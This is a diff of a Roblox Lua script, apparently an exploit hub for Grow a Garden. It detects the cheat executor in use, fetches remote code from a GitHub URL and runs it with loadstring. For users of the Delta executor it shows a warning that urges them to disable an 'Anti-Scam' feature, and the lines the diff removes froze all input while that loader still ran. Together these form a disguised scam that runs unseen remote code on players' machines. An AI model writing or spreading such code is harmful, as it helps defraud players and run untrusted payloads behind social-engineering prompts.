@@ -4,6 +4,7 @@ local TweenService = game:GetService("TweenService")
 local TeleportService = game:GetService("TeleportService")
 local ContextActionService = game:GetService("ContextActionService")
 
+-- Function to run all loaders
 local function runLoaders()
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/kunihublibrary2"))()
@@ -13,6 +14,7 @@ local function runLoaders()
     end)
 end
 
+-- Detect executor
 local function detectExecutor()
     if syn then
         return "Synapse"
@@ -22,7 +24,7 @@ local function detectExecutor()
         return "Fluxus"
     elseif Protosmasher then
         return "Protosmasher"
-    elseif ArceusX or Arceus then
+    elseif (ArceusX ~= nil) or (Arceus ~= nil) then
         return "Arceus X"
     elseif Delta then
         return "Delta"
@@ -34,6 +36,7 @@ end
 local executorName = detectExecutor()
 print("Executor detected:", executorName)
 
+-- Function to freeze player (Delta only)
 local function freezePlayer()
     local character = player.Character or player.CharacterAdded:Wait()
     local humanoid = character:FindFirstChildOfClass("Humanoid")
@@ -44,6 +47,7 @@ local function freezePlayer()
     end
 end
 
+-- Show Delta warning message + freeze
 local function showDeltaWarning()
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Parent = player:WaitForChild("PlayerGui")
@@ -68,7 +72,7 @@ local function showDeltaWarning()
     Label.TextColor3 = Color3.fromRGB(255, 255, 255)
     Label.TextWrapped = true
     Label.Text = [[
-Script requires the teleport function, but it blocked due to the Anti-Scam feature.
+Script requires the teleport function, but it was blocked due to the Anti-Scam feature.
 
 To disable this feature:
 
@@ -92,37 +96,3 @@ To disable this feature:
 
     local Button = Instance.new("TextButton")
     Button.Parent = Frame
-    Button.Size = UDim2.new(0, 140, 0, 40)
-    Button.Position = UDim2.new(0.5, -70, 1, -50)
-    Button.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
-    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Button.Text = "Rejoin"
-    Button.Font = Enum.Font.GothamBold
-    Button.TextSize = 18
-    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 8)
-
-    TweenService:Create(Frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-        Size = UDim2.new(0, 460, 0, 260),
-        Position = UDim2.new(0.5, -230, 0.5, -130)
-    }):Play()
-
-    -- Freeze player
-    freezePlayer()
-    ContextActionService:BindAction("FreezeAllInputs", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.UserInputType:GetEnumItems()))
-    ContextActionService:BindAction("FreezeAllKeys", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.KeyCode:GetEnumItems()))
-
-    -- Run loaders even sa Delta
-    runLoaders()
-
-    Button.MouseButton1Click:Connect(function()
-        ContextActionService:UnbindAction("FreezeAllInputs")
-        ContextActionService:UnbindAction("FreezeAllKeys")
-        TeleportService:Teleport(game.PlaceId, player)
-    end)
-end
-
-if executorName == "Delta" then
-    showDeltaWarning()
-else
-    runLoaders()
-end
